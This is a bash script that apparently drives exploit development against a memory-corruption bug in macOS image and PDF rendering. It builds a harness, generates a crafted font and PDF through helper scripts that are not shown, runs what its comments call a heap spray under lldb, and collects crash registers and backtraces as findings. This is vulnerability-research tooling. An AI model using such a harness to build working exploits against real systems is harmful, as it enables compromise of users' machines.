#!/bin/bash
# RIP-5: relay — dense dp spray (render5) + lldb-scripted convergence (rip5.py)
set -x
cd detonation/cve-2026-86950
clang -O2 -g -o render5 render5.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python -c "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('k2_e64.ttf', 64)"
./venv/bin/python gen_pdf.py k2_e64.pdf k2_e64.ttf
rm -f rip5log.txt rip5_trace.txt
lldb -b ./render5 -o "command script import $PWD/../cg-extract/rip5.py" > rip5_session.txt 2>&1 || true
# final forensics: bt on last logged strike tag if a release crash was flagged
WIN=$(grep -E "winner" rip5_trace.txt 2>/dev/null | tail -1 | grep -oE "s[0-9]+" | head -1)
if [ -n "$WIN" ]; then
  echo "final bt pass for $WIN"
  lldb -b ./render5 -o "process launch -- k2_r${WIN}.pdf o_f.png 512 f" \
    -o "bt" -o "register read pc lr x0 x1 x8" -o "quit" > rip5_final.txt 2>&1 || true
  grep -E "frame #|stop reason|pc =" rip5_final.txt | head -20 || true
fi
cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{rip5_trace.txt,rip5_session.txt,rip5log.txt,rip5_final.txt} findings/ 2>/dev/null
ls findings/ | wc -l
grep -E "rip5" detonation/cve-2026-86950/rip5_trace.txt 2>/dev/null | head -40
